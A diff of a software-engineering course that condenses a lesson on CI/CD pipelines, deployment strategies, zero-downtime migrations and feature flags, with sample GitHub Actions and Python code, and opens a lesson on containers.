-**WHY YOU ARE LEARNING THIS:** A test suite that only runs when someone remembers to run it is a test suite that will eventually be skipped under a deadline - right when it matters most. CI/CD automates the entire path from "code is committed" to "code is safely running in production."
+A Definition of Done that says “tests pass” is theatre if tests only run when someone remembers. CI/CD automates the path from commit to safely running software — and makes the Phase 76 gates enforceable by machine.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**THREE TERMS (DO NOT BLUR THEM):**
 
-- Docs: [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions) *(Composio fetch)*; practice locally with [nektos/act](https://github.com/nektos/act) *(Composio GitHub)*; catalog: [awesome-actions](https://github.com/sdras/awesome-actions) *(Composio GitHub)*
-- Video: [GitHub Actions tutorial (Tom Shaw)](https://www.youtube.com/watch?v=YLtlz88zrLg) *(Composio YouTube)*; DeepWiki: starter workflows encode language-specific CI patterns *(Composio DeepWiki)*
-- Best animated explanation: [CI/CD In 5 Minutes (Fireship)](https://www.youtube.com/watch?v=42UP1fxi2SY) for the shape, then [What is CI/CD? (IBM Technology)](https://www.youtube.com/watch?v=scEDHsr3APg) which separates continuous integration, delivery, and deployment cleanly, a distinction most explanations blur
-- Alternative: [Continuous Delivery vs Continuous Deployment (Continuous Delivery, Dave Farley)](https://www.youtube.com/watch?v=7SNbDWob6cI) is by the co-author of the book that defined the field, and [Deployment Strategies (ByteByteGo)](https://www.youtube.com/watch?v=AWVTKBUnoIg) covers blue-green, canary, and rolling with the clearest diagrams available
-- Another angle: [Continuous Integration vs Feature Branch Workflow (Modern Software Engineering)](https://www.youtube.com/watch?v=v4Ijkq6Myfc) *(Composio YouTube)* explains why branching strategy and deployment frequency are the same question, and [Feature Flags Explained (CoderDave)](https://www.youtube.com/watch?v=c8KgKTgyFUE) *(Composio YouTube; replaced dead Farley IDs)* explains the mechanism that makes deploying unfinished work safe
-- Interactive simulator: the pipeline itself is the simulator, and it is free. Create a repository, add a GitHub Actions workflow, and deliberately break it in each possible way: a failing test, a lint error, a missing secret, a dependency that will not install. Watching each failure mode in the log teaches more than any diagram. Then add [act](https://github.com/nektos/act) to run those same workflows locally so the feedback loop is seconds instead of minutes, and use [DORA's quick check](https://dora.dev/quickcheck/) to score your own delivery performance against the research
-- Written documentation: [GitHub Actions documentation](https://docs.github.com/en/actions) is the most practical starting point, [Continuous Delivery](https://continuousdelivery.com/) by Humble and Farley is the foundational text, [the DORA State of DevOps research](https://dora.dev/research/) is the empirical evidence for every claim in this section, and [Google's SRE Book chapter on release engineering](https://sre.google/sre-book/release-engineering/) for how it works at extreme scale
-- GitHub implementation: [Awesome Actions](https://github.com/sdras/awesome-actions) for a catalogue of real workflows, [Argo CD](https://github.com/argoproj/argo-cd) for GitOps-style continuous deployment where the repository is the source of truth, and [Flagger](https://github.com/fluxcd/flagger) which automates canary analysis and rollback based on metrics
-- Practice platform: [GitHub Skills' CI/CD courses](https://skills.github.com/) are free and hands-on, [Katacoda-style scenarios on KillerCoda](https://killercoda.com/) provide throwaway environments, and the most valuable practice is adding a real pipeline to a real project of your own
+| Term | Means |
+| ---- | ----- |
+| **Continuous integration** | Merge to shared main frequently; every merge triggers build + tests. Frequency is the point — long-lived branches diverge superlinearly |
+| **Continuous delivery** | Every green commit produces a *deployable* artifact; shipping is a business decision (one click / approval) |
+| **Continuous deployment** | Green commits go to production with no human gate — needs strong verification and rollback |
 
-**STEP-BY-STEP EXPLANATION**
+Most teams should reach delivery; deployment is optional and honest about risk.
 
-Three terms are routinely used interchangeably and mean different things, and the distinction is the substance of this section. **Continuous integration** means every developer merges to the shared main branch frequently, at least daily, and every merge automatically triggers a build and the full test suite. The point is not the automation, it is the *frequency*: the longer branches live apart, the more they diverge, and integration pain grows superlinearly with time apart. **Continuous delivery** means every commit that passes the pipeline is automatically built into a release artifact that is provably deployable, so shipping becomes a business decision rather than an engineering event. **Continuous deployment** goes one step further and actually releases it without a human in the loop. Most organisations should reach continuous delivery; whether to take the final step depends on how good the automated verification and rollback are.
-
-A pipeline is a sequence of **stages ordered by cost**, and getting that order right is most of pipeline design. Cheap, fast checks run first so that obvious failures report in seconds rather than after a twenty-minute integration suite. A defensible order is: lint and format, type check, unit tests, build, integration tests, security and dependency scanning, then end-to-end tests against a deployed preview. Each stage is a gate, and the arrangement means the median failure is discovered almost immediately.
-
-The property that makes this trustworthy is **hermetic, reproducible builds**. The same commit must produce the same artifact regardless of when or where it is built, which requires pinning dependencies with a lockfile, pinning base images by digest rather than by a mutable tag, and never mutating a published artifact. The related rule is **build once, promote the same artifact**: the binary or container image tested in staging must be byte-identical to the one that reaches production, because rebuilding for each environment reintroduces exactly the variability the pipeline exists to eliminate. Environment-specific configuration is therefore injected at runtime rather than baked in, which is the twelve-factor principle.
-
-**Deployment strategies** exist because replacing all instances at once means any bad release is a total outage. **Rolling** replaces instances in batches, which is the default in most orchestrators and requires that two versions coexist safely. **Blue-green** runs a complete second environment and switches traffic atomically, giving the fastest possible rollback at the cost of double the infrastructure. **Canary** sends a small percentage of real traffic to the new version and compares error rates and latency against the old one, automatically rolling back if the metrics degrade, which is the only strategy that catches problems that appear solely under real production traffic. All three share one prerequisite: because two versions run simultaneously, **database migrations must be backward compatible**, applied as expand-then-contract rather than as a single breaking change.
-
-The critical decoupling, and the idea that resolves most of the tension in this topic, is that **deployment and release are different events**. Deploying puts code on a server. Releasing exposes behaviour to users. **Feature flags** separate them, so unfinished work can be merged and deployed continuously while remaining invisible, which is what makes trunk-based development and short-lived branches practical. The cost is real and worth stating: flags are conditional branches that multiply the number of possible states, and a flag that is never removed becomes permanent complexity, so every flag needs an owner and an expiry.
-
-Finally, the pipeline is where security scanning belongs, because it is the one place every change passes through. Dependency scanning against known vulnerability databases, static analysis, secret detection so credentials never reach history, and container image scanning are all cheap to run automatically and expensive to do by hand. And the pipeline must have credentials, which makes it a high-value target: secrets belong in a managed store injected at runtime, short-lived tokens are strongly preferable to long-lived ones, and third-party actions should be pinned to a commit hash rather than a mutable tag, because a supply-chain compromise of a popular action reaches every repository that uses it.
-
-The empirical backing for all of this is the DORA research, which found four metrics that predict organisational performance: deployment frequency, lead time from commit to production, change failure rate, and time to restore service. The finding that surprises people is that speed and stability are not a trade-off. The same practices, small changes, automated verification, and fast rollback, improve both simultaneously, because small changes are easier to verify and faster to undo.
-
-**BEFORE VS. AFTER**
+**PIPELINE ORDERED BY COST:**
 
 ```text
-Manual testing and manual deployment
-        Problem: inconsistent, skippable under pressure, and a deploy
-        that "should be fine" can silently break production with no
-        automated check catching it first.
-
-CI (Continuous Integration): every commit automatically triggers the
-full test suite (Phase 39.2) on a clean environment
-CD (Continuous Deployment): a change that passes CI is automatically
-(or with one click) shipped to production, often gradually
-        Fix: broken code is caught within minutes of being written, by
-        a machine, every single time -- not caught (or missed) by a
-        tired human at 5pm on a Friday.
-        Trade-off: real infrastructure and pipeline configuration to
-        build and maintain, and a discipline of keeping the pipeline
-        itself fast enough that people don't route around it.
+git push
+  → [1] lint + format ........... ~10s   style / obvious errors
+  → [2] type check .............. ~30s
+  → [3] unit tests .............. ~60s   logic (Phase 74)
+  → [4] BUILD ARTIFACT ......... ~2min  ONCE — tagged with commit SHA
+  → [5] integration tests ....... ~4min  real DB in container
+  → [6] security scan ........... ~1min  deps, secrets, image CVEs
+  → [7] deploy SAME artifact → staging
+  → [8] E2E smoke ............... ~5min  few critical paths
+  → [9] deploy SAME artifact → production (progressive)
+  → [10] verify metrics; degrade → rollback
 ```
 
-**PICTURE IT LIKE THIS**
+Median failures are lint/unit — report them in under ~90 seconds or people route around the pipeline. **Build once, promote the same artifact**: rebuilding per environment reintroduces the variance CI exists to remove. Environment config and **secrets are injected at runtime**, never baked into the image (Phase 78 owns the packaging detail; the pipeline rule starts here).
 
-A car factory assembly line, and specifically the part of the Toyota system that everyone finds counterintuitive. Any worker who spots a defect can pull a cord and stop the entire line. Stopping the line is enormously expensive per minute, which is why the instinct is to let the flawed part continue and fix it at the end. Toyota's insight was that the cost of a defect grows with how far down the line it travels, so stopping now, when the problem is visible and localised, is dramatically cheaper than discovering it in a finished car, or worse, in a customer's driveway. A red build is that cord being pulled, which is why "the main branch is broken and everyone keeps merging anyway" is the single worst state a team can be in.
+**DEPLOY STRATEGIES:**
 
-The staged pipeline is the sequence of inspection stations along that line, deliberately ordered so the cheap checks come first. You do not run the full crash test before verifying the bolts are tightened, because a five-second check that catches the same defect makes the five-hour check unnecessary. Building the artifact once and promoting it is the rule that the car tested at the end of the line is the actual car that ships, not a similar one rebuilt from the same blueprints, because "similar" is where the variability lives.
+| Strategy | Idea | Rollback | Catches prod-only bugs? |
+| -------- | ---- | -------- | ----------------------- |
+| Rolling | Replace instances in batches | Another roll (slow) | Partially |
+| Blue-green | Two environments; flip router | Instant flip back | No (all-or-nothing traffic) |
+| Canary | Small % real traffic; compare metrics | Shift traffic back | **Yes** — that is its job |
 
-Canary deployment is releasing the new model to a hundred customers in one city while monitoring warranty claims, rather than shipping a million units and discovering the fault in aggregate. Feature flags are shipping cars with a feature physically installed but disabled in software, so enabling it later is a configuration change rather than a recall. And the reason both exist is the same reason the cord exists: the cost of a mistake is a function of how many people it reaches before you notice.
-
-**Internal Working, the pipeline as stages ordered by cost**
+All three require **backward-compatible migrations** while two code versions share one database — expand / migrate / contract:
 
 ```text
-  git push
-     |
-     v
-  [ 1 ] lint + format check .............  10 s   fails fast, costs nothing
-     |                                              catches: style, obvious errors
-     v
-  [ 2 ] type check ......................  30 s
-     |                                              catches: whole classes of bug
-     v
-  [ 3 ] unit tests (16.2) ...............  60 s   parallel, -n auto
-     |                                              catches: logic errors
-     v
-  [ 4 ] BUILD ARTIFACT ..................  2 min  <- built ONCE, here
-     |                                              tagged with the commit sha
-     v
-  [ 5 ] integration tests ...............  4 min  real DB in a container
-     |                                              catches: wiring, SQL, schema
-     v
-  [ 6 ] security scanning ...............  1 min  deps, secrets, image CVEs
-     |
-     v
-  [ 7 ] deploy the SAME artifact to staging
-     |
-     v
-  [ 8 ] end-to-end tests ................  5 min  a handful, critical paths
-     |
-     v
-  [ 9 ] deploy the SAME artifact to production, progressively
-     |
-     v
-  [10 ] verify: error rate, latency, business metric
-            degraded? -> automatic rollback
+Rename users.name → users.full_name with zero downtime:
 
-  WHY THIS ORDER: the median failure is a lint error or a unit test,
-  and it now reports in under 90 seconds instead of after 13 minutes.
-  Feedback time governs whether people wait for the pipeline or
-  route around it.
+1 EXPAND   ADD COLUMN full_name; v1 ignores it
+2 DUAL WRITE  write both; read name; backfill batches
+3 SWITCH READS  read full_name; still write both
+4 CONTRACT  stop writing name; later DROP name
 
-  WHY ONE BUILD: the artifact that passed stage 8 is byte-identical
-  to the one deployed at stage 9. Rebuilding per environment
-  reintroduces exactly the variance the pipeline exists to remove.
+Each step independently deployable and reversible.
 ```
 
-**Internal Working, three deployment strategies compared**
+**DEPLOY ≠ RELEASE:**
 
-```text
-ROLLING  -- replace instances in batches
-   v1 v1 v1 v1        ->    v2 v1 v1 v1    ->   v2 v2 v1 v1  -> ...
-   + no extra infrastructure
-   + gradual exposure
-   - both versions serve live traffic, so they MUST be compatible
-   - rollback means another full roll, which is slow
+Feature flags put unfinished code on servers while behaviour stays off. Deploy continuously; release when metrics and product say so. Cost: every flag is a branch; flags need owners and expiry dates or they become permanent complexity.
 
-BLUE-GREEN  -- two complete environments, atomic switch
-   BLUE  (v1) <== 100% traffic        GREEN (v2)  idle, warmed
-                    |
-              flip the router
-                    v
-   BLUE  (v1)  idle, kept            GREEN (v2) <== 100% traffic
-   + rollback is instant: flip back
-   + the new version is fully warmed before any user reaches it
-   - 2x infrastructure cost during the switch
-   - the database is shared, so migrations still must be compatible
+**SECURITY IN THE PIPELINE:**
 
-CANARY  -- a small slice of REAL traffic, judged on metrics
-   v1  <== 95% ---> error rate 0.1%,  p99 120 ms   (baseline)
-   v2  <==  5% ---> error rate 0.1%,  p99 125 ms   OK, widen to 25%
-                    error rate 2.4%,  p99 900 ms   ROLL BACK
-   + the ONLY strategy that catches problems appearing solely under
-     real production traffic, data, and scale
-   + blast radius is bounded to the canary percentage
-   - needs real observability and a defined success metric
-   - slowest to fully roll out
+Secret scanning, dependency audit, image CVE scan, pin third-party Actions to commit SHAs (mutable tags are supply-chain risk). Pipeline credentials are high value — short-lived tokens, least privilege, secrets from a store at runtime.
 
-  ALL THREE require the same thing, and it is the part that is
-  usually forgotten: two versions of the CODE run at the same time
-  against ONE database.
-```
+**DORA (EMPIRICAL BACKING):**
 
-**Internal Working, the expand-contract migration that makes any of this safe**
-
-```text
-GOAL: rename users.name to users.full_name with zero downtime,
-      while v1 and v2 are both live.
-
-THE NAIVE WAY, which breaks:
-      ALTER TABLE users RENAME COLUMN name TO full_name;
-      -> every v1 instance still running instantly 500s
-
-EXPAND / MIGRATE / CONTRACT -- four deploys, each safe alone:
-
-  Deploy 1  EXPAND (schema only, no code change)
-      ALTER TABLE users ADD COLUMN full_name TEXT;
-      v1 ignores it. Nothing can break. Reversible.
-
-  Deploy 2  DUAL WRITE (code)
-      writes go to BOTH name and full_name
-      reads still come from name
-      backfill in batches:
-          UPDATE users SET full_name = name
-           WHERE full_name IS NULL LIMIT 1000;   (repeat)
-
-  Deploy 3  SWITCH READS (code)
-      reads come from full_name, writes still go to both
-      if this is wrong, roll back the CODE only -- both columns
-      are still correct, so rollback is free
-
-  Deploy 4  CONTRACT (code, then schema)
-      stop writing name
-      ...wait long enough that rollback to Deploy 3 is off the table...
-      ALTER TABLE users DROP COLUMN name;
-
-  Each step is independently deployable and independently
-  reversible. That property is what "safe to deploy continuously"
-  actually means, and it is a schema discipline, not a tool.
-
-  The same shape applies to: adding a NOT NULL column (add nullable,
-  backfill, then constrain), changing a type, splitting a table,
-  and changing an API response (add the new field, migrate clients,
-  then remove the old one -- Phase 36.2's versioning, again).
-```
-
-**Internal Working, deploy versus release, and what a feature flag buys**
-
-```text
-WITHOUT FLAGS -- deployment and release are the same event
-   feature branch lives 3 weeks
-       -> diverges from main
-       -> merge conflict pain grows superlinearly
-       -> one enormous, unreviewable, high-risk release
-       -> if it is wrong, revert 3 weeks of work
-
-WITH FLAGS -- the two events are decoupled
-   day 1   merge  if flag("new_checkout"): ...   flag OFF
-           deployed to production, invisible to everyone
-   day 2   merge more of it, still OFF
-   day 5   enable for internal staff only
-   day 6   enable for 1% of users, watch the metrics
-   day 8   50%
-   day 9   100%
-   day 20  DELETE the flag and the old code path
-
-   Deploy = code is on the server.      (continuous, boring)
-   Release = users can see it.          (a business decision)
-
-   THE COST, which is real: every flag is a branch, and n flags
-   mean up to 2^n reachable states, only a few of which you test.
-   A flag with no owner and no expiry date is permanent complexity
-   masquerading as flexibility. Delete them aggressively.
-```
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Strategy              | Extra infrastructure | Rollback speed               | Catches production-only bugs | Two versions live              | Complexity                   |
-| --------------------- | -------------------- | ---------------------------- | ---------------------------- | ------------------------------ | ---------------------------- |
-| Recreate, all at once | none                 | redeploy old, slow           | no                           | no, but there is downtime      | trivial                      |
-| Rolling               | none                 | slow, another full roll      | partially                    | yes                            | low                          |
-| Blue-green            | 2x during the switch | instant                      | no, all-or-nothing traffic   | briefly                        | moderate                     |
-| Canary                | small                | fast, shift traffic back     | yes, this is its purpose     | yes                            | high, needs metrics          |
-| Feature flags         | none                 | instant, flip a config value | yes                          | one deployment, two behaviours | moderate, and it accumulates |
-
-
-
-| Choice                               | Gain                                       | Cost                                                           |
-| ------------------------------------ | ------------------------------------------ | -------------------------------------------------------------- |
-| Run everything in one pipeline stage | simple configuration                       | slow feedback, obvious failures found last                     |
-| Stages ordered by cost               | median failure reports in under 90 seconds | more configuration, needs caching                              |
-| Build once, promote the artifact     | what you tested is what you shipped        | requires runtime configuration injection                       |
-| Rebuild per environment              | seems simpler                              | reintroduces the variance the pipeline exists to remove        |
-| Trunk-based, short-lived branches    | tiny diffs, almost no merge conflicts      | requires flags and genuine test coverage                       |
-| Long-lived feature branches          | isolation while work is unfinished         | integration pain grows superlinearly with time apart           |
-| Deploy on every green commit         | small blast radius, fast recovery          | needs automated rollback and real monitoring                   |
-| Weekly batched release               | feels controlled                           | large diffs, and every failure is ambiguous among many changes |
-
-
-The DORA finding is the one worth internalising because it contradicts the usual intuition: teams that deploy more frequently have *lower* change failure rates, not higher. The mechanism is straightforward once stated. A small change is easier to reason about, easier to test, faster to review, and trivial to revert, so frequency and safety reinforce each other rather than trading off. The corollary is that a slow, ceremonial release process does not buy safety, it buys larger batches, and larger batches are where the risk actually lives.
-
-**SMALL WORKING EXAMPLE**
+Deployment frequency, lead time commit→prod, change failure rate, time to restore. Speed and stability reinforce each other: small changes are easier to verify and faster to undo. Ceremonial monthly batches buy *larger* risk, not safety.
 
 ```yaml
-# .github/workflows/ci.yml
-# A pipeline with the stages ordered by cost, so the median failure
-# reports in seconds. Every non-obvious line is commented with why.
-
+# Shape of a cost-ordered GitHub Actions pipeline (illustrative)
 name: CI
 on:
-  push:        { branches: [main] }
+  push: { branches: [main] }
   pull_request: {}
-
-concurrency:
-  # A new push supersedes the old run. Without this you pay for
-  # CI on commits nobody will ever deploy.
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
-
-permissions:
-  contents: read        # least privilege by default, widened per job
-
 jobs:
-  # ---------- STAGE 1-3: cheap checks, fail fast ----------------
   fast-checks:
     runs-on: ubuntu-latest
-    timeout-minutes: 10          # a hung job must not run forever
     steps:
       - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-          cache: pip             # dependency cache: minutes -> seconds
-      - run: pip install -r requirements-dev.txt
-
-      - name: Lint and format          # ~10 s
-        run: ruff check . && ruff format --check .
-      - name: Type check               # ~30 s
-        run: mypy src/
-      - name: Unit tests               # ~60 s, parallel
-        run: pytest tests/unit -n auto --cov=src --cov-branch
-      - name: Secret scan
-        # Credentials must never reach history. Catching this here
-        # is the difference between a fix and a rotation.
-        uses: gitleaks/gitleaks-action@v2
-
-  # ---------- STAGE 5: integration, against a REAL database ------
+      - run: ruff check . && ruff format --check .
+      - run: pytest tests/unit -n auto
+      - uses: gitleaks/gitleaks-action@v2   # secrets never reach history
   integration:
-    needs: fast-checks               # do not pay for this if lint failed
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
+    needs: fast-checks
     services:
       postgres:
-        image: postgres:16@sha256:0d8f8f0a  # pinned by DIGEST, not tag:
-        env: { POSTGRES_PASSWORD: test }    # a tag is mutable, a digest
-        options: >-                          # is a reproducible build
-          --health-cmd pg_isready --health-interval 5s --health-retries 10
-        ports: ["5432:5432"]
+        image: postgres:16
+        # pin by digest in real repos; inject DATABASE_URL at runtime
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with: { python-version: "3.12", cache: pip }
-      - run: pip install -r requirements-dev.txt
-      - run: alembic upgrade head
-        env: { DATABASE_URL: postgresql://postgres:test@localhost/postgres }
       - run: pytest tests/integration -q
-        env: { DATABASE_URL: postgresql://postgres:test@localhost/postgres }
-
-  # ---------- STAGE 6: dependency and image scanning -------------
-  security:
-    needs: fast-checks
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Known vulnerabilities in dependencies
-        run: pip install pip-audit && pip-audit --strict
-      - name: Static analysis
-        run: pip install bandit && bandit -r src/ -ll
-
-  # ---------- STAGE 4: BUILD ONCE. This artifact is what ships ---
   build:
-    needs: [integration, security]
-    runs-on: ubuntu-latest
-    permissions: { contents: read, packages: write }
-    outputs:
-      image: ${{ steps.meta.outputs.image }}
+    needs: [integration]
     steps:
-      - uses: actions/checkout@v4
-      - uses: docker/setup-buildx-action@v3
-      - uses: docker/login-action@v3
-        with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}   # short-lived, scoped
-      - id: meta
-        # Tag by immutable commit sha, never by "latest". "latest" makes
-        # it impossible to say which code is actually running.
-        run: echo "image=ghcr.io/${{ github.repository }}:${{ github.sha }}" >> $GITHUB_OUTPUT
-      - uses: docker/build-push-action@v6
-        with:
-          push: true
-          tags: ${{ steps.meta.outputs.image }}
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-          provenance: true      # supply-chain attestation
-
-  # ---------- STAGE 7-8: staging, then end-to-end ---------------
-  staging:
+      - run: echo "build image tagged :${{ github.sha }} — promote, do not rebuild"
+  production:
     needs: build
     if: github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    environment: staging
+    environment: production   # approval = delivery; omit for deployment
     steps:
-      - run: ./deploy.sh staging "${{ needs.build.outputs.image }}"
-      - run: npx playwright test --grep @smoke
-
-  # ---------- STAGE 9-10: production, progressively -------------
-  production:
-    needs: staging
-    runs-on: ubuntu-latest
-    environment: production     # gate this on a required reviewer if
-    steps:                      # you want continuous DELIVERY not DEPLOYMENT
-      - name: Canary at 5%
-        # The SAME image that passed staging. Not a rebuild.
-        run: ./deploy.sh production "${{ needs.build.outputs.image }}" --weight 5
-      - name: Judge the canary against the baseline
-        run: ./verify-canary.sh --duration 300 --max-error-rate 0.5 --max-p99-ms 300
-      - name: Full rollout
-        run: ./deploy.sh production "${{ needs.build.outputs.image }}" --weight 100
-      - name: Roll back on any failure above
-        if: failure()
-        run: ./deploy.sh production --rollback
+      - run: ./deploy.sh --image ":${{ github.sha }}" --weight 5   # canary
+      - run: ./verify-canary.sh && ./deploy.sh --weight 100
 ```
 
 ```python
-# ---------------------------------------------------------------
-# Feature flags: the mechanism that separates deploy from release.
-# Small enough to write yourself, which is worth doing once.
-# ---------------------------------------------------------------
-import hashlib, datetime
+# Feature flag: stable bucketing (not random() per request)
+import hashlib
 from dataclasses import dataclass
+import datetime
 
 @dataclass
 class Flag:
-    name: str
-    percentage: int                  # 0-100 of users
-    allowlist: set[str]              # always on, for staff
-    owner: str                       # a flag with no owner never dies
-    expires: datetime.date           # and neither does one with no date
+    percentage: int
+    allowlist: set[str]
+    owner: str
+    expires: datetime.date
 
-FLAGS = {
-    "new_checkout": Flag(
-        name="new_checkout", percentage=5, allowlist={"staff-1", "staff-2"},
-        owner="payments-team", expires=datetime.date(2026, 10, 1),
-    ),
-}
-
-def enabled(flag_name: str, user_id: str) -> bool:
-    f = FLAGS.get(flag_name)
-    if f is None:
-        return False                 # unknown flag fails CLOSED
-    if user_id in f.allowlist:
+def enabled(flag: Flag, name: str, user_id: str) -> bool:
+    if user_id in flag.allowlist:
         return True
-    # Hash the user id so a given user gets a STABLE answer. Using
-    # random() here would flip users between versions on every
-    # request, which produces inconsistent state and unreadable metrics.
-    bucket = int(hashlib.sha256(f"{flag_name}:{user_id}".encode()).hexdigest()[:8], 16) % 100
-    return bucket < f.percentage
-
-def checkout(user_id, cart):
-    if enabled("new_checkout", user_id):
-        return new_checkout_flow(cart)
-    return legacy_checkout_flow(cart)
-
-# The hygiene step people skip, which is why flags accumulate:
-def report_stale_flags():
-    today = datetime.date.today()
-    for f in FLAGS.values():
-        if f.expires < today:
-            print(f"STALE: {f.name} expired {f.expires}, owner {f.owner}")
-        elif f.percentage == 100:
-            print(f"FULLY ROLLED OUT: {f.name} -- delete it and the old path")
-# Run this in CI and fail the build on a stale flag. Otherwise every
-# flag is permanent, and n flags mean 2^n untested states.
+    bucket = int(hashlib.sha256(f"{name}:{user_id}".encode()).hexdigest()[:8], 16) % 100
+    return bucket < flag.percentage
 ```
 
-```bash
-# Run the exact same workflow locally, so the feedback loop is
-# seconds instead of a push-and-wait cycle.
-act -j fast-checks
+**PRACTICE:**
 
-# Pin third-party actions to a commit SHA, not a mutable tag. A tag
-# can be repointed, and a compromised popular action reaches every
-# repository that trusts it.
-#   uses: actions/checkout@v4                     <- mutable
-#   uses: actions/checkout@8ade135a41bc03ea155e62 <- immutable
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Add a workflow that runs lint + unit tests on every PR; break it three ways and read each log |
+| Medium | Build an image tagged by commit SHA; deploy the *same* digest to two environments with runtime config only; add secret scanning |
+| Hard | Walk expand-contract for a column rename; implement canary verification sketch (error rate + p99 vs baseline → rollback) |
 
-# Measure the four DORA metrics from data you already have:
-git log --format='%H %aI' main | head -50        # deployment frequency
-# lead time    = commit timestamp -> deploy timestamp
-# change fail  = deploys requiring a rollback / total deploys
-# restore time = incident start -> incident resolved
-```
+**WHAT THIS UNLOCKS NEXT:**
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-"Describe your team's deployment process" or "how do you make sure a bad change doesn't reach production" are testing whether you've internalized this pipeline as a safety net, not just a corporate buzzword. The question that separates people who have configured a pipeline from people who have operated one is "how would you deploy a database schema change with zero downtime," and the expected answer is the expand-contract sequence with an explanation of why two code versions run simultaneously. Expect "what is the difference between continuous delivery and continuous deployment," where the distinction is whether a human approves the final step. Expect "blue-green versus canary, which would you pick," where the strong answer names the specific thing canary catches that blue-green cannot, namely failures that only appear under real production traffic. Also common: "a deploy just broke production, what do you do," where the correct instinct is to roll back first and diagnose afterwards, because restoring service and understanding the cause are separate goals with different urgencies. A senior-level version asks "your team deploys once a month and every release is painful, how do you change that," and the reasoning to reach for is that batch size is the root cause, so the sequence is to build automated verification, shrink the batches, add flags to decouple release from deploy, and let frequency rise as confidence does.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                             |
-| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Easy       | Add a GitHub Actions workflow to any repository of yours that runs lint and tests on every pull request                                                                                          |
-| Easy       | Deliberately break the build in three different ways and describe what the log showed for each                                                                                                   |
-| Easy       | Explain the difference between continuous integration, continuous delivery, and continuous deployment in three sentences                                                                         |
-| Easy       | Take an existing pipeline and reorder its stages by cost. Report the before and after time to first failure                                                                                      |
-| Easy       | Score your own project with [DORA's quick check](https://dora.dev/quickcheck/) and name the weakest of the four metrics                                                                          |
-| Medium     | Add dependency caching to a pipeline and measure the runtime improvement                                                                                                                         |
-| Medium     | Add a real containerised database to your integration test job and get it passing in CI                                                                                                          |
-| Medium     | Build a container image tagged by commit SHA, push it to a registry, and deploy that exact image to two environments with runtime configuration only                                             |
-| Medium     | Add secret scanning and dependency auditing, then deliberately commit a fake credential and confirm the pipeline blocks it                                                                       |
-| Medium     | Implement the feature flag module above, roll a change from 0 to 100 percent, and show that a given user gets a stable answer throughout                                                         |
-| Medium     | Run your workflow locally with [act](https://github.com/nektos/act) and report how much faster the iteration loop became                                                                         |
-| Medium     | Pin every third-party action in a workflow to a commit SHA and explain the supply-chain risk you just closed                                                                                     |
-| Medium     | Add a CI check that fails the build when a feature flag is past its expiry date                                                                                                                  |
-| Hard       | Perform a complete expand-contract column rename against a running application with zero downtime and zero failed requests. Document all four deploys and prove each is independently reversible |
-| Hard       | Implement blue-green deployment with a load balancer, then measure the exact rollback time by triggering a rollback under load                                                                   |
-| Hard       | Implement automated canary analysis: route 5 percent of traffic, compare error rate and p99 latency against the baseline, and roll back automatically when a threshold is breached               |
-| Hard       | Get a pipeline from 25 minutes to under 8 without removing any check, then document each technique and its individual contribution                                                               |
-| Hard       | Design the full pipeline for a system with three services that must be released together, including how you handle a partial failure halfway through                                             |
-| Hard       | Instrument your own repository to compute all four DORA metrics automatically from git and deployment logs, then report a month of data                                                          |
-| Hard       | Read [the DORA State of DevOps research](https://dora.dev/research/) and write down the three capabilities it identifies that your team lacks, with a concrete plan for one of them              |
-
-
-**MASTERY CHECKPOINT FOR PHASE 77:** For a small project of your own, set up version control with meaningful commit history, write unit tests for the core logic, and describe (even without setting up real infrastructure) what a CI pipeline for that project would run and in what order.
-
-**WHY THE NEXT TOPIC IS NEEDED - Containers & Deployment:** A green pipeline that builds artifacts on a runner still leaves "works on my machine." Packaging the app and its runtime so the same image runs in CI and in production is Phase 78.
+A green pipeline that builds artifacts still leaves “works on my machine.” Packaging the app and its runtime so the same image runs in CI and production is Phase 78.
 
 ---
 
@@ -16981,60 +13442,84 @@ git log --format='%H %aI' main | head -50        # deployment frequency
 
 ---
 
-
-
 # PHASE 78 - Containers & Deployment
 
 **Track:** Professional Software Engineering
 
 **WHAT YOU WILL BE ABLE TO DO:** Package a small service in a container image; explain Dockerfile layers; and distinguish **config env vars** from **secrets** (never bake secrets into an image).
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 77 (CI builds artifacts; containers are a common artifact shape; pipelines inject secrets at runtime), Phase 60-65 (the app still needs a real filesystem and network underneath the box).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 77 — CI builds artifacts; containers are a common artifact shape; pipelines inject secrets at runtime. Phases 60–65 — the app still needs a real filesystem and network underneath the box.
+
+**LEARNING RESOURCES:**
+
+- [Docker explained (The Coding Sloth)](https://www.youtube.com/watch?v=DQdB7wFEygo)
+- [Docker docs — Get Started](https://docs.docker.com/get-started/)
+- [What is Secrets Management? (IBM Technology)](https://www.youtube.com/watch?v=iETENR5MEB8)
+- [prakhar1989/docker-curriculum](https://github.com/prakhar1989/docker-curriculum)
+- [12factor.net — Config](https://12factor.net/config)
 
 ## 78.1 Package Once, Run Anywhere (Almost)
 
-**WHY YOU ARE LEARNING THIS:** "It works on my laptop" usually means hidden dependencies - OS packages, language versions, config files, open ports. Containers bundle the process and its runtime dependencies into an **image** you can run the same way on a laptop, a CI runner, or a server.
+CI can be green while three laptops disagree on Python minor versions and system libraries. Containers bundle the process and its runtime dependencies into an **image** you run the same way on a laptop, a CI runner, or a server. “Almost” remains honest: kernel, hardware, and external services still differ — but the *app runtime* stops being a mystery.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
-
